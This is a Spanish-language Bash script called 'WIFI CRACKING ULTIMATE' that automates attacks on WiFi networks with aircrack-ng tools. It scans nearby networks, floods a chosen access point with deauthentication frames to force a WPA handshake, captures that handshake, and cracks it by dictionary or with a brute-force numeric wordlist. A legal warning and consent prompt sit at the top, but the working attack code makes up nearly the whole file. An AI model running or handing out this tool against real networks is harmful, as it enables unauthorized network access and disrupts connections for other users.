#!/bin/bash

# 🔐 WIFI CRACKING ULTIMATE
# Cracking masivo de contraseñas WiFi - TODAS las modalidades
# Autor: X (sebastian.corao)
# Fecha: $(date)

# 🔴 ADVERTENCIA LEGAL
echo "
██╗    ██╗██╗███████╗██╗    ██╗███╗   ██╗███████╗████████╗
██║    ██║██║██╔════╝██║    ██║████╗  ██║██╔════╝╚══██╔══╝
██║ █╗ ██║██║█████╗  ██║    ██║██╔██╗ ██║█████╗     ██║   
██║███╗██║██║██╔══╝  ██║    ██║██║╚██╗██║██╔══╝     ██║   
╚███╔███╔╝██║██║     ██║    ██║██║ ╚████║███████╗   ██║   
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   
                                                          
🔐 WIFI CRACKING - TODAS LAS MODALIDADES 🔐
"

echo "🔴 ADVERTENCIA LEGAL:"
echo "Este script es SOLO para redes propias y pentesting autorizado."
echo "Crackear WiFi sin autorización es ILEGAL. Úsalo responsablemente."
echo ""
read -p "¿Entiendes y aceptas? (s/N): " acepta
if [[ ! "$acepta" =~ ^[Ss]$ ]]; then
    echo "❌ Operación cancelada"
    exit 1
fi

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Variables globales
WORKDIR="wifi_cracking_results_$(date +%Y%m%d_%H%M%S)"
LOG_FILE="$WORKDIR/wifi_cracking.log"
INTERFACE=""
TARGET_BSSID=""
TARGET_ESSID=""

# Función de limpieza
cleanup() {
    echo -e "${YELLOW}🧹 Limpiando...${NC}"
    if [[ -n "$INTERFACE" ]]; then
        airmon-ng stop "$INTERFACE" 2>/dev/null || true
        ifconfig "$INTERFACE" down 2>/dev/null || true
        iwconfig "$INTERFACE" mode managed 2>/dev/null || true
        ifconfig "$INTERFACE" up 2>/dev/null || true
    fi
    killall airodump-ng aireplay-ng aircrack-ng 2>/dev/null || true
    echo -e "${GREEN}✅ Limpieza completada${NC}"
}

trap cleanup EXIT INT TERM

# Verificar herramientas
verificar_herramientas() {
    echo -e "${BLUE}🔍 Verificando herramientas...${NC}"
    
    local tools=("aircrack-ng" "airodump-ng" "aireplay-ng" "airmon-ng" "hashcat" "reaver" "wifite")
    local missing=()
    
    for tool in "${tools[@]}"; do
        if command -v "$tool" >/dev/null 2>&1; then
            echo -e "${GREEN}✅ $tool${NC}"
        else
            echo -e "${RED}❌ $tool${NC}"
            missing+=("$tool")
        fi
    done
    
    if [[ ${#missing[@]} -gt 0 ]]; then
        echo -e "${YELLOW}⚠️ Herramientas faltantes: ${missing[*]}${NC}"
        echo "Instalar con: sudo apt update && sudo apt install aircrack-ng hashcat reaver wifite"
    fi
    echo ""
}

# Configurar directorio
configurar_directorio() {
    echo -e "${BLUE}📁 Configurando directorio...${NC}"
    mkdir -p "$WORKDIR"/{captures,wordlists,results,reports}
    echo -e "${GREEN}✅ Directorio: $WORKDIR${NC}"
    echo ""
}

# Escanear WiFi
escanear_wifi() {
    echo -e "${PURPLE}📡 ESCANEAR REDES WIFI${NC}"
    echo ""
    
    # Seleccionar interfaz
    echo "Interfaces disponibles:"
    iwconfig 2>/dev/null | grep -E "^[a-zA-Z]" | while read line; do
        iface=$(echo "$line" | awk '{print $1}')
        echo "  $iface"
    done
    echo ""
    read -p "Selecciona interfaz: " INTERFACE
    
    if [[ -z "$INTERFACE" ]]; then
        echo -e "${RED}❌ Interfaz inválida${NC}"
        return
    fi
    
    # Activar modo monitor
    echo -e "${YELLOW}🔧 Activando modo monitor...${NC}"
    airmon-ng start "$INTERFACE" 2>&1 | tee -a "$LOG_FILE"
    
    # Buscar interfaz en modo monitor
    MONITOR_IFACE=$(iwconfig 2>/dev/null | grep -E "Mode:Monitor" | awk '{print $1}')
    if [[ -z "$MONITOR_IFACE" ]]; then
        MONITOR_IFACE="${INTERFACE}mon"
    fi
    
    echo -e "${CYAN}📡 Escaneando redes WiFi...${NC}"
    echo "Presiona Ctrl+C para parar el escaneo"
    
    scan_file="$WORKDIR/captures/scan_$(date +%H%M%S)"
    timeout 30 airodump-ng "$MONITOR_IFACE" --write "$scan_file" --output-format csv 2>/dev/null || true
    
    if [[ -f "${scan_file}-01.csv" ]]; then
        echo -e "${GREEN}✅ Escaneo completado${NC}"
        mostrar_redes_encontradas "${scan_file}-01.csv"
    else
        echo -e "${RED}❌ Error en el escaneo${NC}"
    fi
}

# Mostrar redes encontradas
mostrar_redes_encontradas() {
    local csv_file="$1"
    
    echo -e "${CYAN}📋 REDES ENCONTRADAS:${NC}"
    echo "╭─────────────────────────────────────────────────╮"
    echo "│  CH │ PWR │      ESSID      │      BSSID       │"
    echo "├─────────────────────────────────────────────────┤"
    
    grep -v "^BSSID\|^Station" "$csv_file" | head -20 | while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key; do
        if [[ -n "$bssid" ]] && [[ "$bssid" != "BSSID" ]]; then
            essid=$(echo "$essid" | tr -d ' ')
            [[ -z "$essid" ]] && essid="Hidden"
            bssid_short="${bssid:0:17}"
            printf "│ %3s │ %3s │ %-15s │ %-17s │\n" "$channel" "$power" "${essid:0:15}" "$bssid_short"
        fi
    done
    
    echo "╰─────────────────────────────────────────────────╯"
}

# Capturar handshake
capturar_handshake() {
    echo -e "${PURPLE}🤝 CAPTURAR HANDSHAKE${NC}"
    echo ""
    
    read -p "BSSID objetivo: " TARGET_BSSID
    read -p "Canal: " channel
    read -p "ESSID (opcional): " TARGET_ESSID
    
    if [[ -z "$TARGET_BSSID" ]]; then
        echo -e "${RED}❌ BSSID requerido${NC}"
        return
    fi
    
    handshake_file="$WORKDIR/captures/handshake_$(date +%H%M%S)"
    
    echo -e "${YELLOW}🎯 Capturando handshake de $TARGET_BSSID${NC}"
    echo "Canal: $channel"
    echo "Archivo: $handshake_file"
    echo ""
    
    # Captura en background
    airodump-ng -c "$channel" --bssid "$TARGET_BSSID" -w "$handshake_file" "$MONITOR_IFACE" &
    DUMP_PID=$!
    
    sleep 5
    
    echo -e "${CYAN}💥 Enviando deauth para forzar handshake...${NC}"
    for i in {1..10}; do
        aireplay-ng -0 1 -a "$TARGET_BSSID" "$MONITOR_IFACE" 2>/dev/null
        sleep 2
    done
    
    sleep 10
    kill $DUMP_PID 2>/dev/null || true
    
    # Verificar handshake
    if ls "${handshake_file}"*.cap >/dev/null 2>&1; then
        for cap_file in "${handshake_file}"*.cap; do
            if aircrack-ng "$cap_file" 2>&1 | grep -q "handshake"; then
                echo -e "${GREEN}✅ Handshake capturado: $cap_file${NC}"
                return
            fi
        done
        echo -e "${YELLOW}⚠️ Archivo capturado pero sin handshake válido${NC}"
    else
        echo -e "${RED}❌ No se capturó handshake${NC}"
    fi
}

# Ataque por diccionario
ataque_diccionario() {
    echo -e "${PURPLE}📖 ATAQUE DICCIONARIO${NC}"
    echo ""
    
    # Buscar archivos .cap
    cap_files=($(find "$WORKDIR/captures" -name "*.cap" 2>/dev/null))
    
    if [[ ${#cap_files[@]} -eq 0 ]]; then
        echo -e "${RED}❌ No hay archivos .cap disponibles${NC}"
        echo "Primero captura un handshake"
        return
    fi
    
    echo "Archivos .cap disponibles:"
    for i in "${!cap_files[@]}"; do
        echo "$((i+1))) $(basename "${cap_files[$i]}")"
    done
    
    read -p "Selecciona archivo [1-${#cap_files[@]}]: " selection
    
    if [[ ! "$selection" =~ ^[0-9]+$ ]] || [[ $selection -lt 1 ]] || [[ $selection -gt ${#cap_files[@]} ]]; then
        echo -e "${RED}❌ Selección inválida${NC}"
        return
    fi
    
    selected_cap="${cap_files[$((selection-1))]}"
    
    # Wordlists
    echo ""
    echo "Wordlists disponibles:"
    echo "1) rockyou.txt (recomendado)"
    echo "2) Wordlist personalizada"
    echo "3) Generar wordlist numérica"
    
    read -p "Selecciona [1-3]: " wordlist_option
    
    case $wordlist_option in
        1)
            wordlist="/usr/share/wordlists/rockyou.txt"
            if [[ ! -f "$wordlist" ]]; then
                if [[ -f "/usr/share/wordlists/rockyou.txt.gz" ]]; then
                    echo -e "${YELLOW}📦 Descomprimiendo rockyou.txt...${NC}"
                    sudo gunzip /usr/share/wordlists/rockyou.txt.gz
                    wordlist="/usr/share/wordlists/rockyou.txt"
                else
                    echo -e "${RED}❌ rockyou.txt no encontrado${NC}"
                    return
                fi
            fi
            ;;
        2)
            read -p "Ruta del wordlist: " wordlist
            if [[ ! -f "$wordlist" ]]; then
                echo -e "${RED}❌ Archivo no encontrado${NC}"
                return
            fi
            ;;
        3)
            wordlist="$WORKDIR/wordlists/numeric_$(date +%H%M%S).txt"
            echo -e "${YELLOW}🔢 Generando wordlist numérica...${NC}"
            for i in {00000000..99999999}; do
                echo "$i"
            done > "$wordlist"
            echo -e "${GREEN}✅ Wordlist numérica creada${NC}"
            ;;
    esac
    
    echo -e "${YELLOW}🚀 Iniciando ataque...${NC}"
    echo "Archivo: $(basename "$selected_cap")"
    echo "Wordlist: $(basename "$wordlist")"
    echo ""
    
    result_file="$WORKDIR/results/crack_$(date +%H%M%S).txt"
    
    # Ejecutar aircrack-ng
    aircrack-ng -w "$wordlist" "$selected_cap" 2>&1 | tee "$result_file"
    
    # Verificar resultado
    if grep -q "KEY FOUND" "$result_file"; then
        password=$(grep "KEY FOUND" "$result_file" | awk -F'[\[\]]' '{print $2}')
        echo -e "${GREEN}🎉 ¡CONTRASEÑA ENCONTRADA!${NC}"
        echo -e "${CYAN}🔑 Contraseña: $password${NC}"
    else
        echo -e "${YELLOW}⚠️ Contraseña no encontrada con este wordlist${NC}"
    fi
}

# Menú principal
mostrar_menu() {
    clear
    echo "
██╗    ██╗██╗███████╗██╗    ██╗███╗   ██╗███████╗████████╗
██║    ██║██║██╔════╝██║    ██║████╗  ██║██╔════╝╚══██╔══╝
██║ █╗ ██║██║█████╗  ██║    ██║██╔██╗ ██║█████╗     ██║   
██║███╗██║██║██╔══╝  ██║    ██║██║╚██╗██║██╔══╝     ██║   
╚███╔███╔╝██║██║     ██║    ██║██║ ╚████║███████╗   ██║   
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝    ╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   
                                                          
🔐 WIFI CRACKING ULTIMATE 🔐
"
    echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    echo -e "${CYAN}🎯 MENÚ PRINCIPAL${NC}"
    echo -e "${PURPLE}════════════════════════════════════════════════${NC}"
    echo ""
    echo "1) 📡 Escanear redes WiFi"
    echo "2) 🤝 Capturar handshake"
    echo "3) 📖 Ataque por diccionario"
    echo "4) 🔢 Ataque por fuerza bruta"
    echo "5) 📊 Ver resultados"
    echo "6) 📋 Generar reporte"
    echo "7) ⚙️ Configuración"
    echo "8) ❌ Salir"
    echo ""
    echo -e "${YELLOW}Directorio: $WORKDIR${NC}"
    echo ""
}

# Función principal
main() {
    echo -e "${BLUE}🔧 Inicializando WiFi Cracking Ultimate...${NC}"
    
    if [[ $EUID -ne 0 ]]; then
        echo -e "${RED}❌ Este script requiere permisos de root${NC}"
        echo "Ejecuta con: sudo $0"
        exit 1
    fi
    
    verificar_herramientas
    configurar_directorio
    
    while true; do
        mostrar_menu
        read -p "Selecciona opción [1-8]: " opcion
        
        case $opcion in
            1) escanear_wifi ;;
            2) capturar_handshake ;;
            3) ataque_diccionario ;;
            4) echo -e "${YELLOW}⚠️ Función en desarrollo${NC}" ;;
            5) echo -e "${YELLOW}⚠️ Función en desarrollo${NC}" ;;
            6) echo -e "${YELLOW}⚠️ Función en desarrollo${NC}" ;;
            7) echo -e "${YELLOW}⚠️ Función en desarrollo${NC}" ;;
            8) echo -e "${GREEN}👋 ¡Hasta luego!${NC}"; exit 0 ;;
            *) echo -e "${RED}❌ Opción inválida${NC}"; sleep 2 ;;
        esac
        
        echo ""
        read -p "Presiona Enter para continuar..."
    done
}

main "$@"